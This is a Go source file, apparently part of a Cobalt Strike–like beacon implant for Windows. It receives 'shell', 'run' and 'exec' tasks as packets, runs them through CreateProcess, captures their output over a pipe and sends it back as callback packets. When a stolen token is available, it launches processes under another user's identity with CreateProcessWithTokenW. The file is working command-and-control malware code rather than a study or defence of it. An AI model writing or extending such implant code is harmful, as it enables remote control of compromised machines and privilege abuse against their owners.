package command

import (
	"errors"
	"fmt"
	"golang.org/x/sys/windows"
	"main/packet"
	"os"
	"strings"
	"unsafe"
)

/*
	Run this function should handler both `shell` and `run` cmd, need to return the result

shell would send a payload like `%COMSPEC% /C cmd`,%COMSPEC% as path, `/C cmd` as args,
but run would just send `cmd` as args, and with a path length 0
%COMSPEC% point to cmd.exe usually, and we always read %COMSPEC% as app, follow as args
we have extracted path and args before call Run, so only deploy how to run a process is ok
*/
func Run(b []byte) error {
	path, args, err := parseCommandShell(b)
	if err != nil {
		return err
	}
	result, err := runNative(string(path), string(args))
	if err != nil {
		return err
	}
	finalPacket := packet.MakePacket(CALLBACK_OUTPUT, result)
	packet.PushResult(finalPacket)
	return nil
	//path = strings.Trim(path, " ")
	//args = strings.Trim(args, " ")
	//// handler with `shell` cmd, env var is not fully supported
	//if path == "%COMSPEC%" {
	//	envKey := strings.ReplaceAll(path, "%", "")
	//	resolvedPath := os.Getenv(envKey)
	//	// trim /C
	//	args = args[3:]
	//	cmd := exec.Command(resolvedPath, "/C", args)
	//	return cmd.CombinedOutput()
	//} else { // run cmd
	//	if len(path) != 0 {
	//		return nil, errors.New("get a path from run cmd")
	//	}
	//	// SplitN means split string into n parts, so it should be 2
	//	parts := strings.SplitN(args, " ", 2)
	//	var cmd *exec.Cmd
	//	// golang doesn't support ternary operator
	//	if len(parts) == 2 {
	//		// it seems ok to pass whole args as one string in windows?
	//		cmd = exec.Command(parts[0], parts[1])
	//	} else {
	//		cmd = exec.Command(parts[0])
	//	}
	//	return cmd.CombinedOutput()
	//}
}

// just don't use cmd.exe, exec may also call CreateProcess to implement?
func Exec(b []byte) error {
	err := execNative(b)
	if err != nil {
		return err
	}
	finalPacket := packet.MakePacket(CALLBACK_OUTPUT, []byte("exec success"))
	packet.PushResult(finalPacket)
	return nil
	//parts := strings.SplitN(string(b), " ", 2)
	//var cmd *exec.Cmd
	//if len(parts) == 2 {
	//	cmd = exec.Command(parts[0], parts[1])
	//} else {
	//	cmd = exec.Command(parts[0])
	//}
	//return cmd.Start()
}

// call windowsAPI CreateProcess, when it's cmd `shell`, %COMSPEC% will be the path
// and cmd run doesn't give path, as set path to null and args as commandline
func runNative(path string, args string) ([]byte, error) {
	args = strings.Trim(args, " ")
	var (
		sI windows.StartupInfo
		pI windows.ProcessInformation

		hWPipe windows.Handle
		hRPipe windows.Handle
	)

	sa := windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		SecurityDescriptor: nil,
		InheritHandle:      1, //true
	}

	// create anonymous pipe
	err := windows.CreatePipe(&hRPipe, &hWPipe, &sa, 0)
	if err != nil {
		return nil, errors.New(fmt.Sprintf("CreatePipe error: %s", err))
	}
	defer windows.CloseHandle(hWPipe)
	defer windows.CloseHandle(hRPipe)

	sI.Flags = windows.STARTF_USESTDHANDLES
	sI.StdErr = hWPipe
	sI.StdOutput = hWPipe

	var pathPtr *uint16
	// path should only be null or %COMSPEC%
	if path == "" {
		pathPtr = nil
	} else if path == "%COMSPEC%" {
		envKey := strings.ReplaceAll(path, "%", "")
		resolvedPath := os.Getenv(envKey)
		pathPtr = windows.StringToUTF16Ptr(resolvedPath)
	} else {
		return nil, errors.New("path is not null or %COMSPEC%")
	}
	err = createProcessNative(pathPtr, windows.StringToUTF16Ptr(args), nil, nil, true, 0, nil, nil, &sI, &pI)

	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(pI.Process)
	defer windows.CloseHandle(pI.Thread)

	_, _ = windows.WaitForSingleObject(pI.Process, windows.INFINITE)
	_, _ = windows.WaitForSingleObject(pI.Thread, windows.INFINITE)

	buf := make([]byte, 1024*8)
	//var done uint32 = 4096
	var read windows.Overlapped
	_ = windows.ReadFile(hRPipe, buf, nil, &read)

	return buf[:read.InternalHigh], nil
}

func execNative(b []byte) error {
	var sI windows.StartupInfo
	var pI windows.ProcessInformation

	program, _ := windows.UTF16PtrFromString(string(b))
	// when appName set to null, will use the first part of commandLine as the app, and rest as args
	defer windows.CloseHandle(pI.Process)
	defer windows.CloseHandle(pI.Thread)
	return createProcessNative(nil, program, nil, nil, true, 0, nil, nil, &sI, &pI)
}

// if there is a token, use it to create new process
func createProcessNative(appName *uint16, commandLine *uint16, procSecurity *windows.SecurityAttributes, threadSecurity *windows.SecurityAttributes, inheritHandles bool, creationFlags uint32, env *uint16, currentDir *uint16, startupInfo *windows.StartupInfo, outProcInfo *windows.ProcessInformation) error {
	if isTokenValid {
		_, _, err := createProcessWithTokenW.Call(uintptr(stolenToken), LOGON_WITH_PROFILE, uintptr(unsafe.Pointer(appName)), uintptr(unsafe.Pointer(commandLine)), uintptr(creationFlags), uintptr(unsafe.Pointer(env)), uintptr(unsafe.Pointer(currentDir)), uintptr(unsafe.Pointer(startupInfo)), uintptr(unsafe.Pointer(outProcInfo)))
		if err != nil && err != windows.SEVERITY_SUCCESS {
			return errors.New(fmt.Sprintf("CreateProcessWithTokenW error: %s", err))
		}
	} else {
		err := windows.CreateProcess(appName, commandLine, procSecurity, threadSecurity, inheritHandles, creationFlags, env, currentDir, startupInfo, outProcInfo)
		if err != nil {
			return errors.New(fmt.Sprintf("CreateProcess error: %s", err))
		}
	}
	return nil
}
